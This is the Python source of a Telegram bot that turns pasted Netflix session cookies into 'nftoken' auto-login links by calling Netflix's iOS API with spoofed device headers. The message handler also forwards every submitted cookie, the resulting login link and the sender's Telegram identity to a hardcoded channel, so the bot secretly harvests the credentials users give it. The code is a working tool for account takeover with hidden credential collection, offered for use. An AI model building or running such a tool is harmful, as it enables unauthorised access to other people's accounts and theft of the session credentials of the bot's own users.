import os
import json
import re
import urllib.parse
from datetime import datetime
import telebot
import requests
import time
from telebot import apihelper

# ============================================
# RAILWAY CONFIG - Environment Variable से Token लें
# ============================================
apihelper.READ_TIMEOUT = 60
apihelper.CONNECT_TIMEOUT = 60

BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    print("❌ TELEGRAM_TOKEN not found in environment variables!")
    exit(1)

CHANNEL_ID = "-1003937881669"
WATERMARK = "github.com/harshitkamboj"

# ============================================
# NETFLIX API
# ============================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============================================
# BOT INITIALIZE
# ============================================
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# COOKIE PARSING
# ============================================

def parse_netscape_cookie_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return {}
    
    if "\t" in line:
        parts = line.split("\t")
    else:
        parts = re.split(r'\s+', line)
    
    if len(parts) >= 7:
        return {parts[-2]: parts[-1]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("="):
            continue
        if ".netflix.com" in line:
            cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = _decode_cookie_value(data[key])
    except:
        pass
    
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"{re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = _decode_cookie_value(match.group(1))
    
    return cookie_dict

def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

# ============================================
# SAVE TO CHANNEL
# ============================================

def save_to_channel(cookie_text, nftoken_link, expires, user_id, username):
    cookie_short = cookie_text[:500] + "..." if len(cookie_text) > 500 else cookie_text
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = "📥 NEW NFToken Generated!\n\n"
    message += "👤 User: " + username + " (ID: " + str(user_id) + ")\n"
    message += "⏰ Time: " + current_time + "\n\n"
    message += "🔗 NFToken Link:\n"
    message += "`" + nftoken_link + "`\n\n"
    message += "⏳ Expires: `" + expires + "`\n\n"
    message += "🍪 Cookie:\n"
    message += "```\n" + cookie_short + "\n```\n\n"
    message += "---\n"
    message += "🔹 Generated by: @NetflixNFTBot\n"
    message += "🔹 " + WATERMARK
    
    try:
        sent_msg = bot.send_message(CHANNEL_ID, message, parse_mode='Markdown')
        return True, sent_msg.message_id
    except Exception as e:
        return False, str(e)

# ============================================
# TELEGRAM COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    text = (
        "😵 **NETFLIX NF TOKEN** 😵\n\n"
        "👑 **Owner:** ❤️ 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈 ❤️\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📌 **Commands:**\n"
        "   🍪 Send Cookie → Get Token\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📱 **Contact:** @PawanSaini\n"
        "⚡ **Made with ❤️ by:** 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈"
    )
    bot.reply_to(message, text, parse_mode='Markdown')
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    text = message.text
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    
    if 'NetflixId' in text or '.netflix.com' in text:
        msg = bot.reply_to(message, "⏳ Processing cookie...")
        
        try:
            cookie_dict = extract_cookie_dict(text)
            if not cookie_dict:
                bot.edit_message_text("❌ Invalid cookie format!", msg.chat.id, msg.message_id)
                return
            
            token, expires = fetch_nftoken(cookie_dict)
            nftoken_link = build_nftoken_link(token)
            expiry_str = format_expiry(expires)
            
            success = "✅ NFToken Ready!\n\n"
            success += "🔗 Link:\n`" + nftoken_link + "`\n\n"
            success += "⏰ Expires: `" + expiry_str + "`\n\n"
            success += "📢 Saved in Channel!"
            
            bot.edit_message_text(success, msg.chat.id, msg.message_id, parse_mode='Markdown')
            
            save_to_channel(text, nftoken_link, expiry_str, user_id, username)
            
        except Exception as e:
            bot.edit_message_text("❌ Error: " + str(e), msg.chat.id, msg.message_id)
    else:
        bot.reply_to(message, "🤔 Cookie nahi mili.\n\nCookie bhejo: NetflixId=xxx; SecureNetflixId=xxx")

# ============================================
# BOT RUN - Railway के लिए
# ============================================
if __name__ == "__main__":
    print("🤖 Bot Starting on Railway...")
    print("📢 Channel ID: " + CHANNEL_ID)
    print("=" * 40)
    print(WATERMARK)
    print("=" * 40)
    
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print("⚠️ Error: " + str(e))
            print("🔄 Reconnecting in 10 seconds...")
            time.sleep(10)
